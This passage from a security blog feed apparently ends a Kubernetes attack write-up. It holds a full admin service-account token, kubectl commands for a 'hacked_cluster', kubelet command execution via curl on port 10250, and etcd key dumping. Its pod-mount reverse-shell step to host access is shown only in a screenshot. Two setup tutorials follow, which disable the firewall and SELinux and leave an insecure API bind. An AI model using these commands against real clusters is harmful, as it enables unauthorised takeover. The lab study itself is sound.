--token&#x3D;eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi11c2VyLXRva2VuLXpxZmh2Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFkbWluLXVzZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIzZjg2Y2I0Ni05OTJkLTRjMjEtYjI1OC0zZmFmYTQ2ZTE0YjEiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06YWRtaW4tdXNlciJ9.V2wo-WrgJnk0C5Ur8WEVmAhyBagbYaec6toySBXtaui87j8X8fbYylSD-tCnBlv30WkCX4VZ_sanoq7HpdUl0-1aRk3U6GT_ZgoPEQQL7OuULEA5Qia4ZuJpNa-sbNSzvnFn-dvWRzdR-lommnpOvFYiCx7c5ZK1zfk1nLRaQGDVjUspHAlxFutBevroSZqfAyW3WU1Crc0kAZuvj1gvyKs32XAAU-sgARdiCwyLWfshIjQn51lvTUk_C77RSlM3wj2uEbmOwnacKcLnDXPzpi3Lz85ecI-bz030TsuwN_i2wsZPLkhLz3E6A3D66ZlyBESeBj-qdTwbcnr92nNFugkubectl --kubeconfig&#x3D;.&#x2F;test_config config set-cluster hacked_cluster --server&#x3D;https:&#x2F;&#x2F;192.168.3.19:6443&#x2F;  --insecure-skip-tls-verifykubectl --kubeconfig&#x3D;.&#x2F;test_config config set-context test_context --cluster&#x3D;hacked_cluster --user&#x3D;hackerkubectl --kubeconfig&#x3D;.&#x2F;test_config config use-context test_context<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k8.png"></p><pre class="line-numbers language-none"><code class="language-none">加载config文件，获得pods，nodes等信息，同理可得交互shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k9.png"></p><pre class="line-numbers language-none"><code class="language-none">也可以不新建文件，直接带着token<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k10.png"></p><h3 id="dashboard"><a href="#dashboard" class="headerlink" title="dashboard"></a>dashboard</h3><pre class="line-numbers language-none"><code class="language-none">默认情况下部署完后需要先kubectl proxy，才能访问dashboard，但是如果将端口映射在宿主机上，那么所有能访问到机器的用户都能直接访问dashboard通过配置文件修改，可添加跳过认证<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="实际利用-1"><a href="#实际利用-1" class="headerlink" title="实际利用"></a>实际利用</h4><pre class="line-numbers language-none"><code class="language-none">点击跳过可直接进入后台页面<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k11.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k12.png"></p><pre class="line-numbers language-none"><code class="language-none">在安装dashboard的时候会默认增加dashboard-admin账户具备cluster-admin角色权限，如果能够找到相关的admin账户token也可以尝试利用token进入dashboard<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="kubelet"><a href="#kubelet" class="headerlink" title="kubelet"></a>kubelet</h3><pre class="line-numbers language-none"><code class="language-none">每个节点都有个kubelet的服务，默认情况下kubelet在10250端口开放api服务，另外还监听10248端口，以供其他组件检查kubelet的运行状态10248端口，暂时没有特别的风险10250端口，默认情况下apiserver访问kubelet需要客户端证书，但如果发生如下任意情况1）攻击者获取了apiserver访问kubelet客户端的证书  2）将kubelet的--anonymous-auth参数设置为true，且authorization.mode设置为AlwaysAllow则攻击者将能够直接和kubelet交互，从而实现节点的控制<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="实际利用-2"><a href="#实际利用-2" class="headerlink" title="实际利用"></a>实际利用</h4><pre class="line-numbers language-none"><code class="language-none">访问pods路径如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k13.png"></p><pre class="line-numbers language-none"><code class="language-none">涉及POD、NAMESPACE、CONTAINERS关键字如下【中间环境重新安装过，内容些许不一样，但不影响学习】关注metadata.name，metadata.namespace，spec.containers.name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k14.png"></p><pre class="line-numbers language-none"><code class="language-none">利用kubeletctl，同理获取POD、NAMESPACE、CONTAINERS.&#x2F;kubeletctl_darwin_amd64  pods -s 192.168.3.21 --port 10250<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k15.png"></p><pre class="line-numbers language-none"><code class="language-none">结合获取到的信息可进步命令执行curl -k https:&#x2F;&#x2F;192.168.3.21:10250&#x2F;run&#x2F;$namespace&#x2F;$POD&#x2F;$CONTAINERS -d &quot;cmd&#x3D;ls&quot; --insecure<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k16.png"></p><h3 id="etcd"><a href="#etcd" class="headerlink" title="etcd"></a>etcd</h3><pre class="line-numbers language-none"><code class="language-none">如果能够获得etcd中的数据，将能够进步获得更高权限从而控制集群默认启动监听2379、2380两个端口，前者用于客户端连接，后者用于多个etcd实例之间的通信默认情况下两个端口提供的服务器都是需要相应证书才能访问（禁止匿名访问），但如果攻击者获得了证书，或者用户设置为了匿名访问，那么就能够直接访问etcd并进步窃取数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="实际利用-3"><a href="#实际利用-3" class="headerlink" title="实际利用"></a>实际利用</h4><pre class="line-numbers language-none"><code class="language-none">页面如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k17.png"></p><pre class="line-numbers language-none"><code class="language-none">利用etcdctl进步遍历keyexport ETCDCTL_API&#x3D;3.&#x2F;etcdctl --endpoints&#x3D;http:&#x2F;&#x2F;192.168.3.19:2379&#x2F; get &#x2F; --prefix --keys-only若启用https.&#x2F;etcdctl --insecure-transport&#x3D;false --insecure-skip-tls-verify --endpoints&#x3D;https:&#x2F;&#x2F;192.168.3.19:2379&#x2F; get &#x2F; --prefix --keys-only基于进步获得到的key、token结合先前的kubectl同理操作<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="token其他利用"><a href="#token其他利用" class="headerlink" title="token其他利用"></a>token其他利用</h3><pre class="line-numbers language-none"><code class="language-none">除了进入交互shell外足够权限的token还可以进步部署pod需要注意部分token没法直接创建pod<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k18.png"></p><pre class="line-numbers language-none"><code class="language-none">权限足够可以创建pod如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k19.png"></p><pre class="line-numbers language-none"><code class="language-none">同理进入bash，此处是进入创建的pod<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k20.png"></p><pre class="line-numbers language-none"><code class="language-none">通过部署的pod而挂载的目录进步写反弹shell，可获得宿主机权限如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s3/k21.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CloudSecurity </tag>
            
            <tag> RCE </tag>
            
            <tag> Kubernetes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes部署应用</title>
      <link href="2022/03/25/kubernetes-bu-shu-ying-yong/"/>
      <url>2022/03/25/kubernetes-bu-shu-ying-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><pre class="line-numbers language-none"><code class="language-none">主要为master &amp; node安装master:192.168.3.19node1:192.168.3.20node2:192.168.3.21<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="实际安装"><a href="#实际安装" class="headerlink" title="实际安装"></a>实际安装</h2><pre class="line-numbers language-none"><code class="language-none">主从机都要安装 epel-release源yum -y install epel-release设置hostnamehostnamectl  set-hostname node1关闭防火墙systemctl stop firewalldsystemctl disable firewalldsetenforce 0sed -i &#39;s&#x2F;^SELINUX&#x3D;enforcing$&#x2F;SELINUX&#x3D;disabled&#x2F;&#39; &#x2F;etc&#x2F;selinux&#x2F;config最后确认状态firewall-cmd --state<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s1/k1.png"></p><h3 id="master配置"><a href="#master配置" class="headerlink" title="master配置"></a>master配置</h3><h4 id="host配置"><a href="#host配置" class="headerlink" title="host配置"></a>host配置</h4><pre class="line-numbers language-none"><code class="language-none">echo &quot;192.168.3.19    master192.168.3.20  node1192.168.3.21  node2&quot; &gt;&gt; &#x2F;etc&#x2F;hostsnode也要配下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="服务安装"><a href="#服务安装" class="headerlink" title="服务安装"></a>服务安装</h4><pre class="line-numbers language-none"><code class="language-none">安装etcd、kubernetes-master<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="etc-kubernetes-config-kubernetest配置文件"><a href="#etc-kubernetes-config-kubernetest配置文件" class="headerlink" title="/etc/kubernetes/config  kubernetest配置文件"></a>/etc/kubernetes/config  kubernetest配置文件</h5><pre class="line-numbers language-none"><code class="language-none"># logging to stderr means we get it in the systemd journal 错误日志记录到文件还是输出到stderrKUBE_LOGTOSTDERR&#x3D;&quot;--logtostderr&#x3D;true&quot;# journal message level, 0 is debug 日志等级KUBE_LOG_LEVEL&#x3D;&quot;--v&#x3D;0&quot;# Should this cluster be allowed to run privileged docker containers  允许运行特权容器KUBE_ALLOW_PRIV&#x3D;&quot;--allow-privileged&#x3D;false&quot;# How the controller-manager, scheduler, and proxy find the apiserver  apiserver的服务地址controller-manager、scheduler及kubelet都会使用KUBE_MASTER&#x3D;&quot;--master&#x3D;http:&#x2F;&#x2F;192.168.3.19:8080&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s1/k2.png"></p><h4 id="etc-etcd-etcd-conf"><a href="#etc-etcd-etcd-conf" class="headerlink" title="/etc/etcd/etcd.conf"></a>/etc/etcd/etcd.conf</h4><pre class="line-numbers language-none"><code class="language-none"># [Member]# ETCD_CORS&#x3D;&quot;&quot;# etcd数据存储位置ETCD_DATA_DIR&#x3D;&quot;&#x2F;var&#x2F;lib&#x2F;etcd&#x2F;default.etcd&quot;# ETCD_WAL_DIR&#x3D;&quot;&quot;# ETCD_LISTEN_PEER_URLS&#x3D;&quot;http:&#x2F;&#x2F;localhost:2380&quot; 监听的端口ETCD_LISTEN_CLIENT_URLS&#x3D;&quot;http:&#x2F;&#x2F;0.0.0.0:2379&quot;# ETCD_MAX_SNAPSHOTS&#x3D;&quot;5&quot;# ETCD_MAX_WALS&#x3D;&quot;5&quot;# etcd名称ETCD_NAME&#x3D;&quot;default&quot;# ETCD_SNAPSHOT_COUNT&#x3D;&quot;100000&quot;# ETCD_HEARTBEAT_INTERVAL&#x3D;&quot;100&quot;# ETCD_ELECTION_TIMEOUT&#x3D;&quot;1000&quot;# ETCD_QUOTA_BACKEND_BYTES&#x3D;&quot;0&quot;# ETCD_MAX_REQUEST_BYTES&#x3D;&quot;1572864&quot;# ETCD_GRPC_KEEPALIVE_MIN_TIME&#x3D;&quot;5s&quot;# ETCD_GRPC_KEEPALIVE_INTERVAL&#x3D;&quot;2h0m0s&quot;# ETCD_GRPC_KEEPALIVE_TIMEOUT&#x3D;&quot;20s&quot;## [Clustering]# ETCD_INITIAL_ADVERTISE_PEER_URLS&#x3D;&quot;http:&#x2F;&#x2F;localhost:2380&quot;  集群监听的端口ETCD_ADVERTISE_CLIENT_URLS&#x3D;&quot;http:&#x2F;&#x2F;localhost:2379&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s1/k3.png"></p><h4 id="etc-kubernetes-apiserver"><a href="#etc-kubernetes-apiserver" class="headerlink" title="/etc/kubernetes/apiserver"></a>/etc/kubernetes/apiserver</h4><pre class="line-numbers language-none"><code class="language-none">#### kubernetes system config## The following values are used to configure the kube-apiserver## The address on the local server to listen to. 监听的接口，如果是127则只监听localhost，如果是0.0.0.0则监听全部KUBE_API_ADDRESS&#x3D;&quot;--insecure-bind-address&#x3D;0.0.0.0&quot;# The port on the local server to listen on.  apiserver的监听默认8080KUBE_API_PORT&#x3D;&quot;--port&#x3D;8080&quot;# Port minions listen onKUBELET_PORT&#x3D;&quot;--kubelet-port&#x3D;10250&quot;  kubelet的监听端口，默认10250# Comma separated list of nodes in the etcd cluster  etcd服务地址，端口2379KUBE_ETCD_SERVERS&#x3D;&quot;--etcd-servers&#x3D;http:&#x2F;&#x2F;127.0.0.1:2379&quot;# Address range to use for services  kubernetes可分配的ip范围，启动一个pod及service就会分配一个ip地址，将按扎个范围分配KUBE_SERVICE_ADDRESSES&#x3D;&quot;--service-cluster-ip-range&#x3D;10.254.0.0&#x2F;16&quot;# default admission control policies  集群额外配置项KUBE_ADMISSION_CONTROL&#x3D;&quot;--admission-control&#x3D;NamespaceLifecycle,NamespaceExists,LimitRanger,SecurityContextDeny,ResourceQuota&quot;# Add your own!KUBE_API_ARGS&#x3D;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="启动服务，并设置自启动"><a href="#启动服务，并设置自启动" class="headerlink" title="启动服务，并设置自启动"></a>启动服务，并设置自启动</h4><pre class="line-numbers language-none"><code class="language-none">etcd、kube-apiserver、kube-controller-manager、kube-scheduler等for SERVICES in etcd kube-apiserver kube-controller-manager kube-scheduler; do systemctl restart $SERVICES;systemctl enable $SERVICES;systemctl status $SERVICES ; done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="定义flannel网络"><a href="#定义flannel网络" class="headerlink" title="定义flannel网络"></a>定义flannel网络</h4><pre class="line-numbers language-none"><code class="language-none">etcdctl mk &#x2F;atomic.io&#x2F;network&#x2F;config &#39;&#123;&quot;Network&quot;:&quot;172.17.0.0&#x2F;16&quot;&#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="node配置"><a href="#node配置" class="headerlink" title="node配置"></a>node配置</h3><pre class="line-numbers language-none"><code class="language-none">安装kubernetes Node、flannel组件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s1/k4.png"></p><h4 id="etc-sysconfig-flanneld"><a href="#etc-sysconfig-flanneld" class="headerlink" title="/etc/sysconfig/flanneld"></a>/etc/sysconfig/flanneld</h4><pre class="line-numbers language-none"><code class="language-none">为flannel网络指定etcd服务# Flanneld configuration options  # etcd url location.  Point this to the server where etcd runs  etcd的地址和端口FLANNEL_ETCD_ENDPOINTS&#x3D;&quot;http:&#x2F;&#x2F;192.168.3.19:2379&quot;# etcd config key.  This is the configuration key that flannel queries# For address range assignment  服务范围FLANNEL_ETCD_PREFIX&#x3D;&quot;&#x2F;atomic.io&#x2F;network&quot;# Any additional options that you want to pass  其他# FLANNEL_OPTIONS&#x3D;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s1/k5.png"></p><h4 id="etc-kubernetes-config"><a href="#etc-kubernetes-config" class="headerlink" title="/etc/kubernetes/config"></a>/etc/kubernetes/config</h4><pre class="line-numbers language-none"><code class="language-none">#### kubernetes system config## The following values are used to configure various aspects of all# kubernetes services, including##   kube-apiserver.service#   kube-controller-manager.service#   kube-scheduler.service#   kubelet.service#   kube-proxy.service# logging to stderr means we get it in the systemd journalKUBE_LOGTOSTDERR&#x3D;&quot;--logtostderr&#x3D;true&quot;# journal message level, 0 is debugKUBE_LOG_LEVEL&#x3D;&quot;--v&#x3D;0&quot;# Should this cluster be allowed to run privileged docker containersKUBE_ALLOW_PRIV&#x3D;&quot;--allow-privileged&#x3D;false&quot;# How the controller-manager, scheduler, and proxy find the apiserverKUBE_MASTER&#x3D;&quot;--master&#x3D;http:&#x2F;&#x2F;192.168.3.19:8080&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s1/k6.png"></p><h4 id="etc-kubernetes-kubelet"><a href="#etc-kubernetes-kubelet" class="headerlink" title="/etc/kubernetes/kubelet"></a>/etc/kubernetes/kubelet</h4><pre class="line-numbers language-none"><code class="language-none">修改node机器的kubelet配置文件#### kubernetes kubelet (minion) config# The address for the info server to serve on (set to 0.0.0.0 or &quot;&quot; for all interfaces)  minion监听的地址KUBELET_ADDRESS&#x3D;&quot;--address&#x3D;0.0.0.0&quot;# The port for the info server to serve on  监听的端口KUBELET_PORT&#x3D;&quot;--port&#x3D;10250&quot;# You may leave this blank to use the actual hostnameKUBELET_HOSTNAME&#x3D;&quot;--hostname-override&#x3D;192.168.3.20&quot;# location of the api-server  apiserverKUBELET_API_SERVER&#x3D;&quot;--api-servers&#x3D;http:&#x2F;&#x2F;192.168.3.19:8080&quot;# pod infrastructure containerKUBELET_POD_INFRA_CONTAINER&#x3D;&quot;--pod-infra-container-image&#x3D;registry.access.redhat.com&#x2F;rhel7&#x2F;pod-infrastructure:latest&quot;# Add your own!KUBELET_ARGS&#x3D;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s1/k7.png"></p><h4 id="启动服务，并设置自启动-1"><a href="#启动服务，并设置自启动-1" class="headerlink" title="启动服务，并设置自启动"></a>启动服务，并设置自启动</h4><pre class="line-numbers language-none"><code class="language-none">kube-proxy,kubelet,docker,flanneld等for SERVICES in kube-proxy kubelet docker flanneld;do systemctl restart $SERVICES;systemctl enable $SERVICES;systemctl status $SERVICES; done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="返回master查看配置成功"><a href="#返回master查看配置成功" class="headerlink" title="返回master查看配置成功"></a>返回master查看配置成功</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s1/k8.png"></p><pre class="line-numbers language-none"><code class="language-none">重复组建node2即可，效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s1/k9.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CloudSecurity </tag>
            
            <tag> Kubernetes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes基础环境搭建</title>
      <link href="2022/03/25/kubernetes-ji-chu-huan-jing-da-jian/"/>
      <url>2022/03/25/kubernetes-ji-chu-huan-jing-da-jian/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-none"><code class="language-none">在已有的集群环境下进行实际应用部署<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="期间会用到的部分基本命令"><a href="#期间会用到的部分基本命令" class="headerlink" title="期间会用到的部分基本命令"></a>期间会用到的部分基本命令</h2><h3 id="kubectl-run"><a href="#kubectl-run" class="headerlink" title="kubectl  run"></a>kubectl  run</h3><pre class="line-numbers language-none"><code class="language-none">kubectl run NAME --image&#x3D;image [--env&#x3D;&quot;key&#x3D;value&quot;] [--port&#x3D;port] [--replicas&#x3D;replicas] [--dry-run&#x3D;bool] [--overrides&#x3D;inline-json] [--command] -- [COMMAND] [args...]如启动nginx实例：kubectl run nginx --image&#x3D;nginx附带端口：kubectl run nginx --image&#x3D;nginx  --port&#x3D;18080kubectl run testapp --image&#x3D;ccr.ccs.tencentyun.com&#x2F;k8s-tutorial&#x2F;test-k8s:v1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s2/k1.png"></p><h3 id="创建pod"><a href="#创建pod" class="headerlink" title="创建pod"></a>创建pod</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s2/k2.png"></p><pre class="line-numbers language-none"><code class="language-none">kubetcl  apply -f testpod.yaml创建成功如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s2/k3.png"></p><h3 id="创建deployment"><a href="#创建deployment" class="headerlink" title="创建deployment"></a>创建deployment</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s2/k4.png"></p><h2 id="pod常用命令"><a href="#pod常用命令" class="headerlink" title="pod常用命令"></a>pod常用命令</h2><h3 id="部署应用"><a href="#部署应用" class="headerlink" title="部署应用"></a>部署应用</h3><pre class="line-numbers language-none"><code class="language-none">kubetcl  apply -f pod.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查看全部"><a href="#查看全部" class="headerlink" title="查看全部"></a>查看全部</h3><pre class="line-numbers language-none"><code class="language-none">kubectl get all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s2/k5.png"></p><h3 id="查看deployment-pod"><a href="#查看deployment-pod" class="headerlink" title="查看deployment pod"></a>查看deployment pod</h3><pre class="line-numbers language-none"><code class="language-none">kubectl get deploymentkubectl get pod -o wide<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s2/k6.png"></p><h3 id="查看所有-amp-指定namespace下的pod"><a href="#查看所有-amp-指定namespace下的pod" class="headerlink" title="查看所有&amp;指定namespace下的pod"></a>查看所有&amp;指定namespace下的pod</h3><pre class="line-numbers language-none"><code class="language-none">kubectl get pods --all-namespaceskubectl get pod -n default<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s2/k7.png"></p><h3 id="查看describe"><a href="#查看describe" class="headerlink" title="查看describe"></a>查看describe</h3><pre class="line-numbers language-none"><code class="language-none">kubectl describe pod podnamekubectl describe pod tomcat-deployment-2212675085-g5rkj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s2/k8.png"></p><h3 id="查看pod-log"><a href="#查看pod-log" class="headerlink" title="查看pod log"></a>查看pod log</h3><pre class="line-numbers language-none"><code class="language-none">kubectl logs  tomcat-deployment-2212675085-g5rkj<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s2/k9.png"></p><h3 id="进入pod"><a href="#进入pod" class="headerlink" title="进入pod"></a>进入pod</h3><pre class="line-numbers language-none"><code class="language-none">kubectl exec -it  tomcat-deployment-2212675085-g5rkj  bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s2/k10.png"></p><h3 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h3><pre class="line-numbers language-none"><code class="language-none">kubectl cp pod-name:容器内文件路径 &#x2F;root&#x2F;主机目录文件 -n namespacekubectl -n default  cp &#x2F;root&#x2F;1.war  tomcat-deployment-2212675085-g5rkj:&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;1.war<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s2/k11.png"></p><h3 id="pod端口映射"><a href="#pod端口映射" class="headerlink" title="pod端口映射"></a>pod端口映射</h3><pre class="line-numbers language-none"><code class="language-none">kubectl port-forward tomcat-deployment-2212675085-g5rkj  8090:8081<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s2/k12.png"></p><h3 id="删除deployment-pod"><a href="#删除deployment-pod" class="headerlink" title="删除deployment pod"></a>删除deployment pod</h3><pre class="line-numbers language-none"><code class="language-none">kubectl delete deployment tomcat-deploymentkubectl delete  pod tomcat-deployment-2212675085-4z1c2强制删除kubectl delete  pod tomcat-deployment-2212675085-4z1c2 --grace-period&#x3D;0 --force<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="实际部署"><a href="#实际部署" class="headerlink" title="实际部署"></a>实际部署</h2><pre class="line-numbers language-none"><code class="language-none">此处以tomcat为案例apiVersion: extensions&#x2F;v1beta1kind: Deploymentmetadata:name: tomcat-deploymentlabels:app: tomcatspec:replicas: 2selector:matchLabels:app: tomcattemplate:metadata:labels:app: tomcatspec:containers:- name: tomcatimage: tomcat:latestports:- containerPort: 8080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s2/k13.png"></p><pre class="line-numbers language-none"><code class="language-none">编写完后kubectl apply -f tomcat.yaml确认状态kubectl get deploymentskubectl get pods --show-labels状态等待变成 running即可添加外部访问方式的服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s2/k14.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s2/k15.png"></p><pre class="line-numbers language-none"><code class="language-none">用上面提及的进容器内的方式，对相关镜像拉下来的tomcat文件进行修改即可，改下web目录就行最终效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s2/k16.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/k8s2/k17.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CloudSecurity </tag>
            
            <tag> Kubernetes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SAMAccountName Spoofing利用&amp;简单分析&amp;修复方式</title>
      <link href="2021/12/15/samaccountname-spoofing-li-yong-jian-dan-fen-xi-xiu-fu-fang-shi/"/>
